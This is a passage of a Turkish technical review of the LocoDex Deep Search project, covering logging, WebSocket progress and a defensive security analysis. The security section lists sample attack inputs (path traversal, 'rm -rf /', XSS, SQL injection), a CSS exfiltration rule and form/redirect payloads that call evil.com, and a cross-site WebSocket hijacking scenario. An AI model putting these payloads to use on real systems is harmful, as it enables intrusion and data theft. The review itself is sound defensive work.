Her seviye bir esik degeri (threshold) tanimlar. Logger'in seviyesi X ise, sadece seviyesi >= X olan mesajlar islenir.

**Matematiksel model:**

```
log_visible(message) = (message.level >= logger.level)
```

LocoDex'te `level=logging.INFO (20)` kullanilir:
- DEBUG (10): GORUNMEZ
- INFO (20): GORUNUR
- WARNING (30): GORUNUR
- ERROR (40): GORUNUR
- CRITICAL (50): GORUNUR

### Console + File Handler Pattern

```python
# Console handler
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(console_formatter)
self.logger.addHandler(console_handler)

# File handler (optional)
if log_file:
    file_handler = logging.FileHandler(str(log_file))
    file_handler.setFormatter(file_formatter)
    self.logger.addHandler(file_handler)
```

IKI farkli formatter kullanilir:

**Console formatter:**
```
%(asctime)s - %(name)s - %(levelname)s - %(message)s
Ornek: 2026-03-15 14:30:45 - together.open_deep_research - INFO - Search complete
```

**File formatter (ek bilgi):**
```
%(asctime)s - %(name)s - %(levelname)s - %(filename)s:%(lineno)d - %(message)s
Ornek: 2026-03-15 14:30:45 - together.open_deep_research - INFO - together_open_deep_research.py:119 - Search complete
```

File formatter DOSYA ADI ve SATIR NUMARASI ekler. Bu, bug debugging icin kritiktir -- hangi dosyanin hangi satirindan log geldigini bilirsiniz.

### Propagation Kontrolu

```python
self.logger.propagate = False
```

Python'un logging sistemi hiyerarsiktir:

```
root logger
  |
  +-- together.open_deep_research (AgentLogger)
  |
  +-- httpx
  |
  +-- LiteLLM
```

`propagate = True` (varsayilan) ise, `together.open_deep_research` logger'ina gelen mesajlar once kendi handler'larindan, sonra root logger'in handler'larindan gecer. Bu, AYNI MESAJIN IKI KERE gorunmesine (duplicate) yol acar.

`propagate = False` ile mesaj sadece kendi handler'lari tarafindan islenir.

## 4.3 Noisy Logger Suppression

### CRITICAL + 1 Trick

```python
litellm_loggers = ["LiteLLM Proxy", "LiteLLM Router", "LiteLLM"]
for logger_name in litellm_loggers:
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.CRITICAL + 1)  # = 51
    logger.propagate = False
```

`logging.CRITICAL = 50`. `CRITICAL + 1 = 51`. Python'da hicbir standart log mesaji 51 veya ustu seviyede degildir. Yani bu logger'dan HICBIR MESAJ gecmez.

Neden `logging.CRITICAL` yerine `CRITICAL + 1`? Cunku CRITICAL seviyesindeki mesajlar gercek hatalari isaret edebilir -- bunlari da gormek isteyebilirsiniz. Ama LiteLLM cok fazla gereksiz CRITICAL mesaj uretir, bu yuzden tamamen susturulmustur.

### httpx Suppression

```python
logging.getLogger("httpx").setLevel(logging.ERROR)
```

httpx, HTTP istemcisidir. Her istekte DEBUG/INFO seviyesinde detayli log uretir (request URL, headers, response status). Bunlar gelistirme disinda islevsizdir. ERROR seviyesi sadece gercek hatalari gosterir.

## 4.4 Distributed Tracing: WebSocket Progress

LocoDex, arastirma ilerlemesini WebSocket uzerinden client'a iletir. Bu, sinirli bir distributed tracing mekanizmasidir.

### Progress Protocol

```python
await websocket.send_json({
    "type": "progress",
    "step": 0.05,  # 0.0 -> 1.0 arasi
    "message": "Konuyu analiz ediyorum..."
})
```

`step` degeri monoton artan (non-decreasing) bir float'tur:

```
0.00 -> Baslangic
0.05 -> Konu analizi
0.10 -> Sorgu olusturma
0.15-0.50 -> Web aramasi (her sorgu icin artis)
0.50-0.80 -> Icerik analizi
0.80-0.90 -> Rapor hazirlama
0.90-0.95 -> Dosya kaydetme
1.00 -> Tamamlandi
```

Bu linear mapping DEGiLDiR. Zaman ile progress arasindaki iliski non-linear:

```
progress(t) != t / T_total
```

Cunku:
- Web arama suresi degisken (network latency, sayfa yuklenme)
- LLM cevap suresi degisken (token uzunlugu, model yuklenme)
- Kaynak sayisi degisken

Bu, progress bar'in "sıçrama" yapmasina yol acar. Ideal bir progress bar smooth olmalidir ama LocoDex'te bu mümkün degildir çünkü islerin ne kadar surecegi onceden bilinmez.

### Keepalive Mechanism

```python
async def keepalive_task():
    while True:
        await asyncio.sleep(30)
        await websocket.send_json({"type": "keepalive"})
```

WebSocket baglantilari, uzun suren sessizlik donemlerinde proxy'ler veya load balancer'lar tarafindan kapatilabilir. Tipik timeout'lar:
- Nginx: 60 saniye (varsayilan)
- AWS ALB: 60 saniye
- Cloudflare: 100 saniye

Her 30 saniyede bir keepalive gondermek, bu timeout'larin hicbirini tetiklemez.

## 4.5 Error Categorization

LocoDex'te hatalar 4 kategoride gruplanabilir:

| Kategori | Ornek | Handler |
|----------|-------|---------|
| Network errors | aiohttp timeout, DNS failure | try/except + fallback |
| Model errors | Ollama model not loaded, LM Studio down | Fallback chain |
| Parsing errors | XML tag parse failure, JSON parse error | Retry (tenacity) |
| Timeout errors | WebSocket receive timeout, model timeout | asyncio.wait_for |

### Timeout Asimetrisi

| Servis | Timeout | Sebep |
|--------|---------|-------|
| LM Studio | 120s | Hafif modeller, hizli cevap beklenir |
| Ollama | 300s | Agir modeller, model yuklenme suresi |
| Together AI (litellm) | 600s | Uzak API, network latency dahil |
| WebSocket receive | 300s | Kullanici etkilesim beklemesi |
| Web scraping | 5-15s | Sayfa yuklenme zamani |

## 4.6 O(n) Analizi

| Islem | Karmasiklik |
|-------|-------------|
| Tek log mesaji yazma | O(L) -- L = mesaj uzunlugu |
| Handler routing | O(H) -- H = handler sayisi (genellikle 2) |
| Level check | O(1) -- integer karsilastirma |
| WebSocket progress | O(1) -- JSON serialize + send |
| Keepalive | O(1) -- sabit boyutlu mesaj |

---

# KONU 5: Guvenlik Analizi

## 5.1 Teorik Temel: Defense in Depth

Guvenlik, tek bir kontrol noktasi ile degil, katmanli savunma (defense in depth) ile saglanir. LocoDex'te su katmanlar mevcuttur:

```
[Kullanici Girdisi]
    -> Input Validation (topic sanitization)
    -> API Key Management (env variables)
    -> Network Security (CORS, WebSocket)
    -> Content Processing (HTML sanitization)
    -> Resource Limits (size, timeout)
    -> Output Generation (safe rendering)
```

## 5.2 Input Validation

### Topic String Sanitization

```python
safe_topic = "".join(c for c in topic if c.isalnum() or c in (' ', '-', '_')).rstrip()[:50]
```

Bu fonksiyon dosya adi olustururken kullanilir. Yaptigihari:

1. Sadece alfanumerik karakterler, bosluk, tire ve alt cizgi kabul edilir
2. Diger tum karakterler atilir (`<`, `>`, `/`, `\`, `..`, `;`, `|` dahil)
3. Son 50 karakter kesilir

**Hangi saldirilari onler?**

| Saldiri Turu | Ornek Girdi | Temizlenmis Hali |
|-------------|-------------|-----------------|
| Path traversal | `../../etc/passwd` | `etcpasswd` |
| Command injection | `; rm -rf /` | ` rm -rf ` |
| XSS in filename | `<script>alert(1)</script>` | `scriptalert1script` |
| Null byte | `topic\x00.exe` | `topicexe` |

**Zayiflik:** Topic STRING'inin KENDISI (web aramasina gonderilen) sanitize EDILMEZ. Sadece dosya adi olusturmada kullanilir. Eger birisi `topic = "'; DROP TABLE users; --"` gonderse, bu string web arama API'sine gonderilir. Ancak LocoDex SQL kullanmaz, yani SQL injection riski yoktur.

### PlatformPaths.create_safe_filename()

```python
@staticmethod
def create_safe_filename(text: str, max_length: int = 50) -> str:
    invalid_chars = '<>:"/\\|?*'
    safe_text = ''.join(c for c in text if c not in invalid_chars)
    safe_text = safe_text.replace(' ', '_')
    safe_text = ''.join(c for c in safe_text if ord(c) >= 32)  # control chars
    safe_text = safe_text.rstrip('.')  # Windows trailing dot issue
    if not safe_text:
        safe_text = 'untitled'
    return safe_text
```

Bu fonksiyon `<>:"/\|?*` karakterlerini cikarir. Bunlar Windows dosya sisteminde gecersiz karakterlerdir. Unix'te sadece `/` ve null byte gecersizdir ama cross-platform uyumluluk icin Windows kisitlamalari uygulanir.

## 5.3 API Key Management

```python
# llms.py
OLLAMA_HOST = os.environ.get("OLLAMA_HOST")
LMSTUDIO_HOST = os.environ.get("LMSTUDIO_HOST")

# webapp.py
if not os.environ.get("TOGETHER_API_KEY") or not os.environ.get("TAVILY_API_KEY"):
    ...
```

API key'ler environment variable olarak alinir, ASLA kaynak koda yazilmaz. Bu, 12-Factor App metodolojisinin 3. maddesine uyar: "Store config in the environment."

**Neden .env dosyasi degil?** `.env` dosyalari yanlislikla git'e commit edilebilir. Environment variable'lar ise process hafizasinda yasarlar ve dosya sisteminde kalici iz birakmazlar.

**Docker'da:**
```bash
docker run -e OLLAMA_HOST=http://host.docker.internal:11434 ...
```

veya docker-compose.yml'de:
```yaml
environment:
  - OLLAMA_HOST=${OLLAMA_HOST}
```

## 5.4 HTML Parsing Guvenligi

### Tehlikeli Element Temizleme

`tavily_search.py` L126-129:
```python
for tag in soup(["script", "style", "iframe", "object", "embed"]):
    tag.decompose()
```

`smart_multilingual_research.py` L407-409:
```python
for script in soup(["script", "style", "nav", "footer", "header"]):
    script.decompose()
```

**Neden bu etiketler?**

| Etiket | Tehlike | Risk Seviyesi |
|--------|---------|---------------|
| `<script>` | JavaScript calistirma (XSS) | KRITIK |
| `<iframe>` | Harici sayfa yukleme (clickjacking) | YUKSEK |
| `<object>` | Flash/Java plugin calistirma | YUKSEK |
| `<embed>` | Harici icerik gomme | YUKSEK |
| `<style>` | CSS injection (exfiltration) | ORTA |
| `<nav>`, `<footer>`, `<header>` | Icerik kirlilik (ana metin degil) | DUSUK |

**CSS injection ornegi:**
```css
input[value^="a"] { background: url("https://evil.com/leak?char=a"); }
```

Bu CSS kurali, bir input alaninin degerini karakter karakter disari sizdirir. `<style>` etiketini kaldirmak bu saldirilari onler.

### Eksik Guvenlik Onlemleri

LocoDex'te `<form>`, `<input>`, `<meta http-equiv="refresh">` ve `<svg onload="...">` etiketleri TEMIZLENMEZ. Potansiyel riskler:

- `<form action="https://evil.com">` -- kullanici verisi sizdirma
- `<meta http-equiv="refresh" content="0;url=evil.com">` -- redirect
- `<svg onload="alert(1)">` -- XSS

Ancak LocoDex cekilmis icerigi LLM'e ozet olarak gonderir, dogrudan kullaniciya HTML olarak sunmaz. Bu, riskleri onemli olcude azaltir.

## 5.5 Content Size Limits

### HTTP Response Limit: 10 MB

```python
if len(resp.content) > 10 * 1024 * 1024:  # 10MB limit
    raise Exception("Content too large")
```

10 MB = 10 * 1024 * 1024 = 10,485,760 byte.

**Neden 10 MB?**
- Normal bir web sayfasi: 500KB - 5MB (goruntuler dahil)
- HTML metni: 50KB - 500KB
- 10 MB ustundeki yanit genellikle buyuk medya dosyasi veya kotu niyetli zip bomb

**Zip bomb tehdidi:** Bir saldirgan Content-Encoding: gzip ile 10 MB gibi gorunen ama decompress edildiginde 10 GB olan icerik gonderebilir. LocoDex'te `resp.content` decompress edilmis boyutu kontrol eder -- bu DOGRU davranistir.

### Text Content Limit: 50 KB

```python
if len(raw_content) > 50000:  # 50KB limit
    raw_content = raw_content[:50000] + "...[truncated]"
```

50,000 karakter ~ 50 KB (ASCII/UTF-8 karakter basi ortalama 1 byte).

**Neden 50 KB?**
- LLM context window'u sinirlidir (4K-128K token)
- 50K karakter ~ 12,500 token (4 karakter/token ortalamasi)
- Bu, cogu LLM'in context window'unun yaklasik %10-50'sini kaplar
- Daha fazla icerik gondermek anlamli bilgi katmaz, maliyeti arttirir

### Content Type Validation

```python
content_type = resp.headers.get('content-type', '').lower()
if not any(ct in content_type for ct in ['text/html', 'text/plain', 'application/xml']):
    raise Exception("Invalid content type")
```

Sadece metin tabanlı icerik turleri kabul edilir. Bu onlem:
- Buyuk medya dosyalarini (video/audio) indirmeyi onler
- Binary dosya islemesinden kaynaklanan hatalari onler
- Gereksiz bant genisligi kullanimini azaltir

## 5.6 User-Agent Header

```python
headers = {
    'User-Agent': 'Mozilla/5.0 (compatible; LocoDex-DeepSearch/1.0)',
    ...
}
```

User-Agent header'i:
1. **Robots.txt uyumlulugu:** Web siteleri User-Agent'a gore erisim izni verebilir/engelleyebilir
2. **Sorumluluk:** Bot trafiginin kaynagi bellidir, site yoneticileri iletisime gecebilir
3. **Rate limiting onleme:** Bos User-Agent genellikle bot olarak tanimlenir ve engellenir

LocoDex hem standard Mozilla User-Agent hem de kendi ismi (`LocoDex-DeepSearch/1.0`) kullanir. Bu "responsible scraping" prensibine uygundur.

## 5.7 CORS ve WebSocket Guvenligi

### WebSocket Baglanti Akisi

```python
@app.websocket("/research_ws")
async def research_websocket(websocket: WebSocket):
    await websocket.accept()  # Tum baglantilari kabul eder
```

**SORUN:** `websocket.accept()` HER baglantiyi kabul eder. Origin kontrolu yoktur. Bu, Cross-Site WebSocket Hijacking (CSWSH) saldirisi icin acik birakir.

**Saldiri senaryosu:**
1. Kurban, evil.com'u ziyaret eder
2. evil.com JavaScript'i kurbanin browser'indan WebSocket acarak `ws://localhost:8001/research_ws` adresine baglanir
3. Saldirgan, kurbanin makinésindeki LocoDex servisini kontrol eder

**Cozum onerileri (LocoDex'te UYGULANMAMIS):**

```python
@app.websocket("/research_ws")
async def research_websocket(websocket: WebSocket):
    origin = websocket.headers.get("origin", "")
    allowed_origins = ["http://localhost:3000", "http://127.0.0.1:3000"]
    if origin not in allowed_origins:
        await websocket.close(code=1008, reason="Origin not allowed")
        return
    await websocket.accept()
```

### JSON Parse Guvenligi

```python
try:
    request = json.loads(data)
except json.JSONDecodeError as e:
    await websocket.send_json({"type": "error", "data": f"JSON hatasi: {str(e)}"})
    continue
```

`json.loads` guvenlidir -- Python'un json modulu arbitrary code execution icermez (pickle'dan farkli olarak). Ancak cok buyuk JSON string'leri bellek tukenmesine (DoS) yol acabilir. LocoDex'te JSON boyut limiti yoktur.

## 5.8 OWASP Top 10 ile Eslestirme

| OWASP 2021 | LocoDex Durumu | Risk |
|------------|----------------|------|
| A01: Broken Access Control | WebSocket origin kontrolu YOK | ORTA |
| A02: Cryptographic Failures | API key'ler env var'da (iyi) | DUSUK |
| A03: Injection | SQL yok, command injection riski dusuk | DUSUK |
| A04: Insecure Design | Fallback chain iyi tasarlanmis | DUSUK |
| A05: Security Misconfiguration | Docker EXPOSE dogru | DUSUK |
| A06: Vulnerable Components | Pinlenmemis dependency versiyonlari | ORTA |
| A07: Auth Failures | Authentication yok (lokal servis) | BILGI |
| A08: Data Integrity | Frozen dataclass ile immutability | DUSUK |
| A09: Logging Failures | Structured logging mevcut | DUSUK |
| A10: SSRF | URL fetch'te domain filtresi sinirli | ORTA |

### Pinlenmemis Dependency'ler

`requirements.txt`:
```
pydantic
litellm
beautifulsoup4
tenacity>=9.0.0
fastapi>=0.110.2
```

`pydantic` ve `litellm` versiyon PIN'i olmadan kullanilir. Bu, `pip install` sirasinda en son versiyonu ceker. Eger yeni versiyonda breaking change veya guvenlik acigi varsa, build bozulabilir. Onerilen: tam versiyon pinleme (`pydantic==2.6.1`).

## 5.9 O(n) Analizi

| Islem | Karmasiklik |
|-------|-------------|
| Filename sanitization | O(L) -- L = string uzunlugu |
| HTML tag temizleme | O(N * T) -- N = tag sayisi, T = tag basina islem |
| Content size check | O(1) -- len() Python'da O(1) |
| Content type validation | O(K) -- K = izin verilen tur sayisi (3) |
| JSON parsing | O(J) -- J = JSON string uzunlugu |
| Origin validation | O(A) -- A = izin verilen origin sayisi |

---

# SONUC

Bu 5 konunun LocoDex Deep Search projesindeki somut implementasyonlari incelendi. Onemli bulgular:

1. **LLM-as-a-Judge** binary scoring ile esnek ama non-deterministik degerlendirme saglar. Cohen's Kappa meta-evaluation icin anahtar metriktir.

2. **Cross-Platform dagitim** Strategy Pattern ile temiz bir sekilde soyutlanmis. Docker layer caching, build surelerini dramatik olarak azaltir.

3. **Veri modelleme** frozen dataclass + Pydantic BaseModel hibrit yaklasimi kullanir. Immutability ve runtime validation bir arada.

4. **Logging** AgentLogger ile yapılandirilmis, noisy logger'lar CRITICAL+1 trick ile susturulmus. WebSocket progress sinirli ama islevsel bir tracing mekanizmasidir.

5. **Guvenlik** defense-in-depth katmanlari mevcut ama WebSocket origin kontrolu ve dependency pinleme gibi eksiklikler var.

---

**Kaynak Dosyalar:**
- `evals.py` -- LLM-as-a-Judge implementasyonu
- `path_utils.py` -- Cross-platform path management
- `data_types.py` -- Frozen dataclass hiyerarsisi
- `tavily_search.py` -- SearchResult base class + guvenlik kontrolleri
- `log.py` -- AgentLogger sinifi
- `server.py` -- WebSocket handler
- `Dockerfile` -- Container konfigurasyonu
- `smart_multilingual_research.py` -- Docker networking fallback chain
- `real_deep_research.py` -- HTML sanitization + content limits
